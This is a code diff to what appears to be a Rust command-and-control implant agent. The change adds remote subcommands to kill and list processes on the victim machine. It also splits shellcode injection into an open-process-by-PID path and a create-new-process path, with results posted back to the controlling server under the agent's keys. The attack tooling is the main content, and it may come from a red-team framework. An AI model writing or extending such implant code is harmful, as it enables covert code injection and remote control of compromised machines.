@@ -22,7 +22,7 @@ use crate::{
             screenshot::screenshot,
             win::{
                 shell::shell,
-                shellcode::shellcode,
+                shellcode::{shellcode_createprocess, shellcode_openprocess},
             },
         },
     },
@@ -310,30 +310,61 @@ pub async fn run(config: Config) -> Result<(), Error> {
                 let mut sys = sysinfo::System::new_all();
                 sys.refresh_all();
 
-                let args = task_args[1..].join(" ");
-                let fx: Vec<&str> = args.split(":").collect();
-                let filter = fx[0];
-                let exclude = fx[1];
+                let subcommand = task_args[1].to_string();
 
-                let mut output = String::new();
-                output = output + "\n";
-                for (pid, process) in sys.processes() {
-                    if  (filter == "*" && exclude == "") ||
-                        (filter == "*" && !process.name().contains(exclude.clone())) ||
-                        (process.name().contains(filter.clone()) && exclude == "") ||
-                        (process.name().contains(filter.clone()) && !process.name().contains(exclude.clone()))
-                    {
-                        output = output + format!("{pid}\t{}\n", process.name()).as_str();
+                match subcommand.as_str() {
+                    "kill" => {
+                        let pid: u32 = task_args[2].parse().unwrap();
+
+                        if let Some(process) = sys.process(sysinfo::Pid::from_u32(pid)) {
+                            process.kill();
+
+                            post_task_result(
+                                &mut hconnect,
+                                "The process killed successfully.".to_string().as_bytes(),
+                                agent_name.to_string(),
+                                config.my_secret_key.clone(),
+                                config.server_public_key.clone(),
+                            ).await;
+                        }
+                    }
+                    "list" => {
+                        let args = task_args[2..].join(" ");
+                        let fx: Vec<&str> = args.split(":").collect();
+                        let filter = fx[0];
+                        let exclude = fx[1];
+        
+                        let mut output = String::new();
+                        output = output + "\n";
+                        for (pid, process) in sys.processes() {
+                            if  (filter == "*" && exclude == "") ||
+                                (filter == "*" && !process.name().contains(exclude.clone())) ||
+                                (process.name().contains(filter.clone()) && exclude == "") ||
+                                (process.name().contains(filter.clone()) && !process.name().contains(exclude.clone()))
+                            {
+                                output = output + format!("{pid}\t{}\n", process.name()).as_str();
+                            }
+                        }
+        
+                        post_task_result(
+                            &mut hconnect,
+                            output.as_bytes(),
+                            agent_name.to_string(),
+                            config.my_secret_key.clone(),
+                            config.server_public_key.clone(),
+                        ).await;
+                    }
+                    _ => {
+                        post_task_result(
+                            &mut hconnect,
+                            "Subcommand not specified.".to_string().as_bytes(),
+                            agent_name.to_string(),
+                            config.my_secret_key.clone(),
+                            config.server_public_key.clone(),
+                        ).await;
                     }
                 }
 
-                post_task_result(
-                    &mut hconnect,
-                    output.as_bytes(),
-                    agent_name.to_string(),
-                    config.my_secret_key.clone(),
-                    config.server_public_key.clone(),
-                ).await;
             }
             "pwd" => {
                 match std::env::current_dir() {
@@ -448,14 +479,37 @@ pub async fn run(config: Config) -> Result<(), Error> {
                 }
             }
             "shellcode" => {
-                let process_name = task_args[1].to_string();
-                let shellcode_b64 = task_args[2].to_string();
+                let process_type = task_args[1].to_string();
+                let shellcode_b64 = task_args[3].to_string();
 
-                match shellcode(process_name, shellcode_b64) {
-                    Ok(result) => {
+                let result = match process_type.as_str() {
+                    "pid" => {
+                        // Open process with specified PID
+                        let pid: u32 = task_args[2].parse().unwrap();
+                        shellcode_openprocess(pid, shellcode_b64)
+                    }
+                    "process" => {
+                        // Create a new process with specified process name
+                        let process = task_args[2].to_string();
+                        shellcode_createprocess(process, shellcode_b64)
+                    }
+                    _ => {
                         post_task_result(
                             &mut hconnect,
-                            &result,
+                            "Process type not specified.".to_string().as_bytes(),
+                            agent_name.to_string(),
+                            config.my_secret_key.clone(),
+                            config.server_public_key.clone(),
+                        ).await;
+                        continue;
+                    }
+                };
+
+                match result {
+                    Ok(r) => {
+                        post_task_result(
+                            &mut hconnect,
+                            &r,
                             agent_name.to_string(),
                             config.my_secret_key.clone(),
                             config.server_public_key.clone(),
